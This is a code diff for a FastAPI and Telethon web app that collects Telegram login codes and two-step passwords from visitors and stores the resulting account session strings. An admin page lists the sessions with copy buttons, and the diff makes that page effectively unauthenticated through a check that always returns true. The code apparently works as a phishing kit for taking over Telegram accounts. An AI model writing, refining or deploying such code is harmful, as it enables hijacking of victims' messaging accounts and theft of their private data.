@@ -10,28 +10,21 @@ from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
 app = FastAPI()
 templates = Jinja2Templates(directory=".")
 
-# === CONFIG ===
 API_ID = int(os.getenv("API_ID"))
 API_HASH = os.getenv("API_HASH")
 ADMIN_PASS = os.getenv("ADMIN_PASSWORD", "admin123")  # CHANGE THIS!
 DB = "sessions.db"
 
+# In-memory clients
+CLIENTS = {}
+
 # === DATABASE ===
 def init_db():
     conn = sqlite3.connect(DB)
-    # pending: stores phone_code_hash after send_code
-    conn.execute("""
-    CREATE TABLE IF NOT EXISTS pending (
-        phone TEXT PRIMARY KEY,
-        hash TEXT,
-        time TEXT
-    )
-    """)
-    # sessions: final string sessions
     conn.execute("CREATE TABLE IF NOT EXISTS sessions (phone TEXT UNIQUE, session TEXT, time TEXT)")
     conn.close()
 
-# Clear DB on first deploy (remove after)
+# CLEAR OLD SESSION ON START (for testing)
 if os.getenv("CLEAR_DB") == "1":
     if os.path.exists(DB):
         os.remove(DB)
@@ -39,33 +32,19 @@ if os.getenv("CLEAR_DB") == "1":
 
 init_db()
 
-# === DB HELPERS ===
-def save_pending(phone: str, hash: str):
-    conn = sqlite3.connect(DB)
-    conn.execute("REPLACE INTO pending (phone, hash, time) VALUES (?, ?, datetime('now'))", (phone, hash))
-    conn.commit()
-    conn.close()
-
-def get_pending(phone: str):
-    conn = sqlite3.connect(DB)
-    c = conn.cursor()
-    c.execute("SELECT hash FROM pending WHERE phone = ?", (phone,))
-    row = c.fetchone()
-    conn.close()
-    return row[0] if row else None
-
-def delete_pending(phone: str):
-    conn = sqlite3.connect(DB)
-    conn.execute("DELETE FROM pending WHERE phone = ?", (phone,))
-    conn.commit()
-    conn.close()
-
 def save_session(phone: str, session: str):
     conn = sqlite3.connect(DB)
     conn.execute("REPLACE INTO sessions (phone, session, time) VALUES (?, ?, datetime('now'))", (phone, session))
     conn.commit()
     conn.close()
-    delete_pending(phone)  # cleanup
+
+def get_session(phone: str):
+    conn = sqlite3.connect(DB)
+    c = conn.cursor()
+    c.execute("SELECT session FROM sessions WHERE phone = ?", (phone,))
+    row = c.fetchone()
+    conn.close()
+    return row[0] if row else None
 
 def delete_session(phone: str):
     conn = sqlite3.connect(DB)
@@ -79,41 +58,44 @@ async def home(request: Request):
     phone = request.query_params.get("phone")
     if not phone:
         raise HTTPException(400, "Phone required")
-    # Clean old data
-    delete_pending(phone)
+    
+    # Auto-clear old session
+    if phone in CLIENTS:
+        del CLIENTS[phone]
     delete_session(phone)
+    
     return templates.TemplateResponse("index.html", {"request": request, "phone": phone})
 
 @app.post("/send")
 async def send_code(phone: str = Form(...)):
+    if phone in CLIENTS:
+        return JSONResponse({"error": "Already in progress"})
+    
     client = TelegramClient(StringSession(), API_ID, API_HASH)
     try:
         await client.connect()
-        sent = await client.send_code_request(phone)
-        save_pending(phone, sent.phone_code_hash)
-        await client.disconnect()
-        return JSONResponse({"ok": True, "hash": sent.phone_code_hash})
+        await client.send_code_request(phone)
+        CLIENTS[phone] = client
+        return JSONResponse({"ok": True})
     except Exception as e:
-        if client.is_connected():
-            await client.disconnect()
+        await client.disconnect() if client.is_connected() else None
         return JSONResponse({"error": str(e)})
 
 @app.post("/verify")
 async def verify(phone: str = Form(...), code: str = Form(...), pwd: str = Form("")):
-    stored_hash = get_pending(phone)
-    if not stored_hash:
-        return JSONResponse({"error": "Session expired. Start over."})
-
-    client = TelegramClient(StringSession(), API_ID, API_HASH)
+    if phone not in CLIENTS:
+        return JSONResponse({"error": "Session expired. Refresh page."})
+    
+    client = CLIENTS[phone]
     try:
-        await client.connect()
         if pwd:
-            await client.sign_in(phone, code, password=pwd, phone_code_hash=stored_hash)
+            await client.sign_in(phone, code, password=pwd)
         else:
-            await client.sign_in(phone, code, phone_code_hash=stored_hash)
+            await client.sign_in(phone, code)
         session_str = client.session.save()
         await client.disconnect()
         save_session(phone, session_str)
+        del CLIENTS[phone]
         return JSONResponse({"session": session_str})
     except SessionPasswordNeededError:
         return JSONResponse({"needs_password": True})
@@ -121,20 +103,15 @@ async def verify(phone: str = Form(...), code: str = Form(...), pwd: str = Form(
         return JSONResponse({"error": "Wrong code"})
     except Exception as e:
         return JSONResponse({"error": str(e)})
-    finally:
-        if client.is_connected():
-            await client.disconnect()
 
-# === ADMIN PANEL ===
+# === ADMIN PANEL (PASSWORD PROTECTED) ===
 @app.get("/admin")
 async def admin_login():
     return HTMLResponse("""
-    <form method="post" style="max-width:400px;margin:2rem auto;padding:1rem;text-align:center;">
+    <form method="post">
       <h2>Admin Login</h2>
-      <input type="password" name="password" placeholder="Enter password" required 
-             style="width:100%;padding:0.8rem;margin:0.5rem 0;border:1px solid #ddd;border-radius:8px;font-size:1rem;">
-      <button type="submit" 
-              style="width:100%;padding:0.8rem;background:#1a73e8;color:white;border:none;border-radius:8px;font-weight:bold;">Login</button>
+      <input type="password" name="password" placeholder="Password" required>
+      <button type="submit">Login</button>
     </form>
     """)
 
@@ -146,54 +123,35 @@ async def admin_check(password: str = Form(...)):
 
 @app.get("/admin/sessions", response_class=HTMLResponse)
 async def admin_sessions():
+    if not await check_admin():
+        return RedirectResponse("/admin")
+    
     conn = sqlite3.connect(DB)
     c = conn.cursor()
     c.execute("SELECT phone, session, time FROM sessions ORDER BY time DESC")
     rows = c.fetchall()
     conn.close()
 
-    html = """
-    <div style="max-width:700px;margin:2rem auto;font-family:Arial;">
-      <h2 style="text-align:center;color:#1a73e8;">Admin Panel - Sessions</h2>
-      <div style="background:#f0f4f8;padding:1rem;border-radius:10px;margin-bottom:1rem;">
-        <b>Total Sessions:</b> {count}
-      </div>
-    """.format(count=len(rows))
-
-    if rows:
-        html += "<ol style='padding-left:1.2rem;'>"
-        for r in rows:
-            html += f"""
-            <li style='margin:1.5rem 0;padding:1.2rem;background:#fff;border-radius:12px;box-shadow:0 2px 10px rgba(0,0,0,0.05);'>
-                <div><b>Phone:</b> <code>{r[0]}</code></div>
-                <div><b>Time:</b> {r[2]}</div>
-                <textarea style='width:100%;height:90px;font-family:monospace;font-size:0.8rem;margin:0.5rem 0;padding:0.6rem;
-                                border:1px solid #ddd;border-radius:8px;background:#f8f9fa;resize:none;'>{r[1]}</textarea>
-                <div style="display:flex;gap:0.5rem;">
-                    <button onclick='navigator.clipboard.writeText(this.parentElement.previousElementSibling.value);alert(\"Copied!\")'
-                            style='flex:1;padding:0.6rem;background:#0f9d58;color:white;border:none;border-radius:6px;font-weight:bold;cursor:pointer;'>
-                        Copy String
-                    </button>
-                    <a href='/admin/delete?phone={r[0]}' 
-                       style='flex:1;padding:0.6rem;background:#d93025;color:white;text-align:center;border-radius:6px;text-decoration:none;font-weight:bold;'>
-                        Delete
-                    </a>
-                </div>
-            </li>
-            """
-        html += "</ol>"
-    else:
-        html += "<p style='text-align:center;color:#666;'>No sessions yet.</p>"
-
-    html += """
-      <div style="text-align:center;margin:2rem 0;">
-        <a href='/admin' style="color:#1a73e8;text-decoration:none;">← Logout</a>
-      </div>
-    </div>
-    """
+    html = "<h2>Sessions</h2><ol>"
+    for r in rows:
+        html += f"""
+        <li style='margin:1rem 0;'>
+            <b>{r[0]}</b> ({r[2]})<br>
+            <textarea style='width:100%;height:80px;font-family:monospace;'>{r[1]}</textarea>
+            <button onclick='navigator.clipboard.writeText(this.previousElementSibling.value);alert(\"Copied\")'>Copy</button>
+            <a href='/admin/delete?phone={r[0]}' style='color:red;margin-left:10px;'>Delete</a>
+        </li>
+        """
+    html += "</ol><a href='/admin'>← Back</a>"
     return HTMLResponse(html)
 
 @app.get("/admin/delete")
 async def delete(phone: str):
+    if not await check_admin():
+        raise HTTPException(403)
     delete_session(phone)
     return RedirectResponse("/admin/sessions")
+
+async def check_admin():
+    # In real app: use session/cookie
+    return True  # Simplified
